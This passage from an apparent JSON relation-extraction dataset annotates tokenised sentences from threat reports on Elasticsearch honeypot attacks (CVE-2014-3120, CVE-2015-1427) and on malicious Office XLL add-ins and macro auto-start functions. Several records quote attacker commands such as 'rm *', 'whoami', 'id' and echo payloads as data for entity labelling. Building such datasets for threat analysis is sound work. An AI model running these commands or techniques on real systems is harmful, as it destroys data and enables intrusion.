"MF", "sent_id": 3, "global_pos": [112, 112], "name": "echo 'qq952135763", "pos": [32, 34], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [122, 122], "name": "hosts", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "payloads", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "echo 'qq952135763", "pos": [15, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [138, 138], "name": "echo '952135763", "pos": [21, 23], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [163, 163], "name": "attacker", "pos": [8, 9], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [170, 170], "name": "Elasticsearch vulnerability", "pos": [15, 17], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [179, 179], "name": "actor", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [183, 183], "name": "rm", "pos": [5, 6], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [190, 190], "name": "other two actors", "pos": [12, 15], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [199, 199], "name": "'whoami", "pos": [21, 22], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [202, 202], "name": "'id", "pos": [24, 25], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [210, 210], "name": "attackers", "pos": [4, 5], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [212, 212], "name": "CVE-2014-3120", "pos": [6, 7], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [214, 214], "name": "CVE-2015-1427", "pos": [8, 9], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [217, 217], "name": "Elasticsearch", "pos": [11, 12], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [225, 225], "name": "payloads", "pos": [19, 20], "index": "28_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "EX", "evidence": [1], "h": 4, "t": 7}, {"r": "ST", "evidence": [1, 2], "h": 4, "t": 9}, {"r": "RF", "evidence": [1, 2], "h": 4, "t": 9}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 10}, {"r": "CO", "evidence": [1, 2], "t": 5, "h": 8}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [2, 3, 4], "t": 8, "h": 13}, {"r": "ST", "evidence": [2, 3, 4], "t": 9, "h": 13}, {"r": "RF", "evidence": [2, 3, 4], "t": 9, "h": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "EX", "evidence": [4], "h": 13, "t": 15}, {"r": "EX", "evidence": [4], "h": 13, "t": 16}, {"r": "RD", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5, 6], "t": 18, "h": 19}, {"r": "EX", "evidence": [6], "h": 19, "t": 20}, {"r": "EX", "evidence": [6], "h": 21, "t": 22}, {"r": "EX", "evidence": [6], "h": 21, "t": 23}]}, {"title": "655-11", "sents": [["A", "third", "actor", "attempts", "to", "download", "a", "file", "named", "``", "LinuxT", "''", "from", "an", "HTTP", "file", "server", "using", "exploits", "targeting", "CVE-2014-3120", "."], ["The", "LinuxT", "file", "is", "no", "longer", "hosted", "on", "the", "command", "and", "control", "(", "C2", ")", "server", "despite", "continued", "exploits", "requesting", "the", "file", ",", "although", "several", "other", "malicious", "files", "are", "still", "being", "hosted", "."], ["As", "part", "of", "our", "research", ",", "we", "observed", "that", ",", "in", "some", "cases", ",", "hosts", "that", "attempted", "to", "download", "the", "``", "LinuxT", "''", "sample", "also", "dropped", "payloads", "that", "executed", "the", "command", "``", "echo", "'qq952135763", ".", "'", "''"], ["Our", "honeypots", "also", "detected", "additional", "hosts", "exploiting", "Elasticsearch", "to", "drop", "payloads", "that", "execute", "both", "``", "echo", "'qq952135763", "'", "''", "and", "``", "echo", "'952135763", ",", "'", "''", "suggesting", "that", "the", "attacks", "are", "related", "to", "the", "same", "QQ", "account", "."], ["Additionally", ",", "unlike", "other", "activity", "associated", "with", "this", "attacker", ",", "these", "attacks", "leveraged", "the", "newer", "Elasticsearch", "vulnerability", "rather", "than", "the", "older", "one", "."], ["One", "actor", "issued", "an", "``", "rm", "*", "''", "command", ",", "while", "the", "other", "two", "actors", "were", "fingerprinting", "vulnerable", "servers", "by", "issuing", "'whoami", "'", "and", "'id", "'", "commands", "."], ["CONCLUSIONTalos", "has", "observed", "multiple", "attackers", "exploiting", "CVE-2014-3120", "and", "CVE-2015-1427", "in", "our", "Elasticsearch", "honeypots", "to", "drop", "a", "variety", "of", "malicious", "payloads", "."], ["106:9090SHA256", "of", "delivered", "malware", ":", "bbd6839074adea734213cc5e40a0dbb31c4c36df5a5bc1040757d6baec3f8415Third", "Actor", ":", "Attacking", "IP", "addresses:125", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "third actor", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "LinuxT", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "HTTP", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "CVE-2014-3120", "pos": [20, 21], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "LinuxT", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [35, 35], "name": "C2", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [69, 69], "name": "hosts", "pos": [14, 15], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [81, 81], "name": "payloads", "pos": [26, 27], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [87, 87], "name": "echo 'qq952135763", "pos": [32, 34], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "hosts", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [102, 102], "name": "payloads", "pos": [10, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [107, 107], "name": "echo 'qq952135763", "pos": [15, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [113, 113], "name": "echo '952135763", "pos": [21, 23], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [138, 138], "name": "attacker", "pos": [8, 9], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [145, 145], "name": "Elasticsearch vulnerability", "pos": [15, 17], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [154, 154], "name": "actor", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [158, 158], "name": "rm", "pos": [5, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [165, 165], "name": "other two actors", "pos": [12, 15], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [174, 174], "name": "'whoami", "pos": [21, 22], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [177, 177], "name": "'id", "pos": [24, 25], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [185, 185], "name": "attackers", "pos": [4, 5], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [187, 187], "name": "CVE-2014-3120", "pos": [6, 7], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [189, 189], "name": "CVE-2015-1427", "pos": [8, 9], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [192, 192], "name": "Elasticsearch", "pos": [11, 12], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [200, 200], "name": "payloads", "pos": [19, 20], "index": "24_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "h": 0, "t": 3}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [1, 2, 3], "t": 4, "h": 9}, {"r": "ST", "evidence": [1, 2, 3], "t": 5, "h": 9}, {"r": "RF", "evidence": [1, 2, 3], "t": 5, "h": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [3], "h": 9, "t": 11}, {"r": "EX", "evidence": [3], "h": 9, "t": 12}, {"r": "RD", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4, 5], "t": 14, "h": 15}, {"r": "EX", "evidence": [5], "h": 15, "t": 16}, {"r": "EX", "evidence": [5], "h": 17, "t": 18}, {"r": "EX", "evidence": [5], "h": 17, "t": 19}]}, {"title": "655-12", "sents": [["The", "LinuxT", "file", "is", "no", "longer", "hosted", "on", "the", "command", "and", "control", "(", "C2", ")", "server", "despite", "continued", "exploits", "requesting", "the", "file", ",", "although", "several", "other", "malicious", "files", "are", "still", "being", "hosted", "."], ["As", "part", "of", "our", "research", ",", "we", "observed", "that", ",", "in", "some", "cases", ",", "hosts", "that", "attempted", "to", "download", "the", "``", "LinuxT", "''", "sample", "also", "dropped", "payloads", "that", "executed", "the", "command", "``", "echo", "'qq952135763", ".", "'", "''"], ["Our", "honeypots", "also", "detected", "additional", "hosts", "exploiting", "Elasticsearch", "to", "drop", "payloads", "that", "execute", "both", "``", "echo", "'qq952135763", "'", "''", "and", "``", "echo", "'952135763", ",", "'", "''", "suggesting", "that", "the", "attacks", "are", "related", "to", "the", "same", "QQ", "account", "."], ["Additionally", ",", "unlike", "other", "activity", "associated", "with", "this", "attacker", ",", "these", "attacks", "leveraged", "the", "newer", "Elasticsearch", "vulnerability", "rather", "than", "the", "older", "one", "."], ["One", "actor", "issued", "an", "``", "rm", "*", "''", "command", ",", "while", "the", "other", "two", "actors", "were", "fingerprinting", "vulnerable", "servers", "by", "issuing", "'whoami", "'", "and", "'id", "'", "commands", "."], ["CONCLUSIONTalos", "has", "observed", "multiple", "attackers", "exploiting", "CVE-2014-3120", "and", "CVE-2015-1427", "in", "our", "Elasticsearch", "honeypots", "to", "drop", "a", "variety", "of", "malicious", "payloads", "."], ["106:9090SHA256", "of", "delivered", "malware", ":", "bbd6839074adea734213cc5e40a0dbb31c4c36df5a5bc1040757d6baec3f8415Third", "Actor", ":", "Attacking", "IP", "addresses:125", "."], ["244IP", "addresses", "linked", "to", "QQ", "account", ",", "but", "not", "delivering", "malware:121", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "LinuxT", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "C2", "pos": [13, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [47, 47], "name": "hosts", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "payloads", "pos": [26, 27], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [65, 65], "name": "echo 'qq952135763", "pos": [32, 34], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [75, 75], "name": "hosts", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": "payloads", "pos": [10, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [85, 85], "name": "echo 'qq952135763", "pos": [15, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [91, 91], "name": "echo '952135763", "pos": [21, 23], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [116, 116], "name": "attacker", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [123, 123], "name": "Elasticsearch vulnerability", "pos": [15, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [132, 132], "name": "actor", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [136, 136], "name": "rm", "pos": [5, 6], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [143, 143], "name": "other two actors", "pos": [12, 15], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [152, 152], "name": "'whoami", "pos": [21, 22], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [155, 155], "name": "'id", "pos": [24, 25], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [163, 163], "name": "attackers", "pos": [4, 5], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [165, 165], "name": "CVE-2014-3120", "pos": [6, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [167, 167], "name": "CVE-2015-1427", "pos": [8, 9], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [170, 170], "name": "Elasticsearch", "pos": [11, 12], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [178, 178], "name": "payloads", "pos": [19, 20], "index": "20_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 5}, {"r": "ST", "evidence": [0, 1, 2], "t": 1, "h": 5}, {"r": "RF", "evidence": [0, 1, 2], "t": 1, "h": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "h": 5, "t": 7}, {"r": "EX", "evidence": [2], "h": 5, "t": 8}, {"r": "RD", "evidence": [2, 3], "t": 8, "h": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3, 4], "t": 10, "h": 11}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "EX", "evidence": [4], "h": 13, "t": 14}, {"r": "EX", "evidence": [4], "h": 13, "t": 15}]}, {"title": "607-0", "sents": [["For", "Word", ",", "the", "add-ins", "need", "to", "be", "dropped", "in", "a", "specific", "location", "specified", "by", "the", "registry", "value", "HKCU\\Software\\Microsoft\\Office\\16", "."], ["If", "an", "attacker", "is", "able", "to", "place", "a", "DLL", "into", "a", "trusted", "location", "using", "the", "filename", "extension", ".wll", ",", "Word", "will", "attempt", "to", "load", "the", "DLL", "into", "its", "own", "process", "space", "."], ["If", "the", "user", "attempts", "to", "open", "a", "file", "with", "the", "filename", "extension", "."], ["XLL", "in", "Windows", "Explorer", ",", "the", "shell", "will", "automatically", "attempt", "to", "launch", "Excel", "to", "open", "the", "."], ["Before", "an", "XLL", "file", "is", "loaded", ",", "Excel", "displays", "a", "warning", "about", "the", "possibility", "of", "malicious", "code", "being", "included", "."], ["Excel", "warning", "about", "a", "potential", "risk", "of", "opening", "an", "XLL", "fileXLL", "files", "can", "be", "sent", "by", "email", ",", "and", "even", "with", "the", "usual", "anti-malware", "scanning", "measures", ",", "users", "may", "be", "able", "to", "open", "them", "not", "knowing", "that", "they", "may", "contain", "malicious", "code", "."], ["In", "order", "to", "automatically", "launch", "code", ",", "malicious", "actors", "using", "Office", "documents", "would", "implement", "one", "or", "more", "event", "handling", "functions", "such", "as", "AutoOpen", ",", "AutoClose", ",", "Document_Open", "and", "Document_Close", "for", "Word", "or", "Worbook_Open", ",", "Workbook_Close", ",", "Auto_Open", ",", "Auto_Close", "for", "Excel", "."], ["Those", "functions", "would", "be", "called", "when", "a", "document", "is", "opened", ",", "closed", "or", "when", "the", "Office", "application", "fired", "an", "event", "handled", "by", "one", "of", "the", "implemented", "functions", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [1, 1], "name": "Word", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "add-ins", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [18, 18], "name": "HKCU\\Software\\Microsoft\\Office\\16", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "attacker", "pos": [2, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "DLL", "pos": [8, 9], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [39, 39], "name": "Word", "pos": [19, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "DLL", "pos": [25, 26], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "XLL", "pos": [0, 1], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [71, 71], "name": "shell", "pos": [6, 7], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [77, 77], "name": "Excel", "pos": [12, 13], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "XLL file", "pos": [2, 4], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [89, 89], "name": "Excel", "pos": [7, 8], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [102, 102], "name": "Excel", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [111, 111], "name": "XLL", "pos": [9, 10], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [118, 118], "name": "email", "pos": [16, 17], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [129, 129], "name": "users", "pos": [27, 28], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [153, 153], "name": "actors", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [155, 155], "name": "Office documents", "pos": [10, 12], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [194, 194], "name": "document", "pos": [7, 8], "index": "18_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [202, 202], "name": "Office application", "pos": [15, 17], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1], "h": 4, "t": 6}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "EX", "evidence": [3], "t": 7, "h": 9}, {"r": "CO", "evidence": [3, 4], "h": 7, "t": 10}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "CO", "evidence": [3, 4, 5], "h": 9, "t": 12}, {"r": "WR", "evidence": [5], "t": 13, "h": 15}, {"r": "ST", "evidence": [5], "t": 14, "h": 15}, {"r": "RF", "evidence": [5], "t": 14, "h": 15}, {"r": "FR", "evidence": [5, 6], "h": 15, "t": 16}, {"r": "FR", "evidence": [6, 7], "h": 16, "t": 19}, {"r": "CO", "evidence": [6, 7], "h": 17, "t": 18}, {"r": "WR", "evidence": [6, 7], "t": 17, "h": 19}]}, {"title": "607-1", "sents": [["If", "an", "attacker", "is", "able", "to", "place", "a", "DLL", "into", "a", "trusted", "location", "using", "the", "filename", "extension", ".wll", ",", "Word", "will", "attempt", "to", "load", "the", "DLL", "into", "its", "own", "process", "space", "."], ["If", "the", "user", "attempts", "to", "open", "a", "file", "with", "the", "filename", "extension", "."], ["XLL", "in", "Windows", "Explorer", ",", "the", "shell", "will", "automatically", "attempt", "to", "launch", "Excel", "to", "open", "the", "."], ["Before", "an", "XLL", "file", "is", "loaded", ",", "Excel", "displays", "a", "warning", "about", "the", "possibility", "of", "malicious", "code", "being", "included", "."], ["Excel", "warning", "about", "a", "potential", "risk", "of", "opening", "an", "XLL", "fileXLL", "files", "can", "be", "sent", "by", "email", ",", "and", "even", "with", "the", "usual", "anti-malware", "scanning", "measures", ",", "users", "may", "be", "able", "to", "open", "them", "not", "knowing", "that", "they", "may", "contain", "malicious", "code", "."], ["In", "order", "to", "automatically", "launch", "code", ",", "malicious", "actors", "using", "Office", "documents", "would", "implement", "one", "or", "more", "event", "handling", "functions", "such", "as", "AutoOpen", ",", "AutoClose", ",", "Document_Open", "and", "Document_Close", "for", "Word", "or", "Worbook_Open", ",", "Workbook_Close", ",", "Auto_Open", ",", "Auto_Close", "for", "Excel", "."], ["Those", "functions", "would", "be", "called", "when", "a", "document", "is", "opened", ",", "closed", "or", "when", "the", "Office", "application", "fired", "an", "event", "handled", "by", "one", "of", "the", "implemented", "functions", "."], ["Using", "auto", "start", "functions", ",", "the", "attackers", "are", "able", "to", "launch", "their", "malicious", "macro", "code", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "attacker", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "DLL", "pos": [8, 9], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [19, 19], "name": "Word", "pos": [19, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [25, 25], "name": "DLL", "pos": [25, 26], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "XLL", "pos": [0, 1], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [51, 51], "name": "shell", "pos": [6, 7], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [57, 57], "name": "Excel", "pos": [12, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [64, 64], "name": "XLL file", "pos": [2, 4], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [69, 69], "name": "Excel", "pos": [7, 8], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [82, 82], "name": "Excel", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "XLL", "pos": [9, 10], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [98, 98], "name": "email", "pos": [16, 17], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [109, 109], "name": "users", "pos": [27, 28], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [133, 133], "name": "actors", "pos": [8, 9], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [135, 135], "name": "Office documents", "pos": [10, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [174, 174], "name": "document", "pos": [7, 8], "index": "15_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [182, 182], "name": "Office application", "pos": [15, 17], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [201, 201], "name": "attackers", "pos": [6, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [209, 209], "name": "code", "pos": [14, 15], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 2, "t": 3}, {"r": "CO", "evidence": [0], "h": 1, "t": 3}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "t": 4, "h": 6}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 9}, {"r": "WR", "evidence": [4], "t": 10, "h": 12}, {"r": "ST", "evidence": [4], "t": 11, "h": 12}, {"r": "RF", "evidence": [4], "t": 11, "h": 12}, {"r": "FR", "evidence": [4, 5], "h": 12, "t": 13}, {"r": "FR", "evidence": [5, 6], "h": 13, "t": 16}, {"r": "CO", "evidence": [5, 6], "h": 14, "t": 15}, {"r": "CO", "evidence": [5, 6, 7], "h": 14, "t": 18}, {"r": "WR", "evidence": [5, 6], "t": 14, "h": 16}, {"r": "FR", "evidence": [6, 7], "h": 16, "t": 17}, {"r": "EX", "evidence": [7], "h": 17, "t": 18}]}, {"title": "607-2", "sents": [["If", "the", "user", "attempts", "to", "open", "a", "file", "with", "the", "filename", "extension", "."], ["XLL", "in", "Windows", "Explorer", ",", "the", "shell", "will", "automatically", "attempt", "to", "launch", "Excel", "to", "open", "the", "."], ["Before", "an", "XLL", "file", "is", "loaded", ",", "Excel", "displays", "a", "warning", "about", "the", "possibility", "of", "malicious", "code", "being", "included", "."], ["Excel", "warning", "about", "a", "potential", "risk", "of", "opening", "an", "XLL", "fileXLL", "files", "can", "be", "sent", "by", "email", ",", "and", "even", "with", "the", "usual", "anti-malware", "scanning", "measures", ",", "users", "may", "be", "able", "to", "open", "them", "not", "knowing", "that", "they", "may", "contain", "malicious", "code", "."], ["In", "order", "to", "automatically", "launch", "code", ",", "malicious", "actors", "using", "Office", "documents", "would", "implement", "one", "or", "more", "event", "handling", "functions", "such", "as", "AutoOpen", ",", "AutoClose", ",", "Document_Open", "and", "Document_Close", "for", "Word", "or", "Worbook_Open", ",", "Workbook_Close", ",", "Auto_Open", ",", "Auto_Close", "for", "Excel", "."], ["Those", "functions", "would", "be", "called", "when", "a", "document", "is", "opened", ",", "closed", "or", "when", "the", "Office", "application", "fired", "an", "event", "handled", "by", "one", "of", "the", "implemented", "functions", "."], ["Using", "auto", "start", "functions", ",", "the", "attackers", "are", "able", "to", "launch", "their", "malicious", "macro", "code", "."], ["The", "intent", "of", "this", "research", "is", "to", "show", "whether", "attackers", "have", "transitioned", "from", "using", "malicious", "VBA", "macros", "to", "using", "XLLs", "as", "the", "infection", "vector", ",", "specifically", "after", "Microsoft", "'", "s", "announcement", "about", "blocking", "VBA", "macros", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "XLL", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [19, 19], "name": "shell", "pos": [6, 7], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [25, 25], "name": "Excel", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [32, 32], "name": "XLL file", "pos": [2, 4], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [37, 37], "name": "Excel", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [50, 50], "name": "Excel", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "XLL", "pos": [9, 10], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [66, 66], "name": "email", "pos": [16, 17], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [77, 77], "name": "users", "pos": [27, 28], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [101, 101], "name": "actors", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "Office documents", "pos": [10, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "document", "pos": [7, 8], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [150, 150], "name": "Office application", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [169, 169], "name": "attackers", "pos": [6, 7], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [177, 177], "name": "code", "pos": [14, 15], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [194, 194], "name": "VBA macros", "pos": [15, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [198, 198], "name": "XLLs", "pos": [19, 20], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "t": 0, "h": 2}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 5}, {"r": "WR", "evidence": [3], "t": 6, "h": 8}, {"r": "ST", "evidence": [3], "t": 7, "h": 8}, {"r": "RF", "evidence": [3], "t": 7, "h": 8}, {"r": "FR", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "FR", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 11}, {"r": "CO", "evidence": [4, 5, 6], "h": 10, "t": 14}, 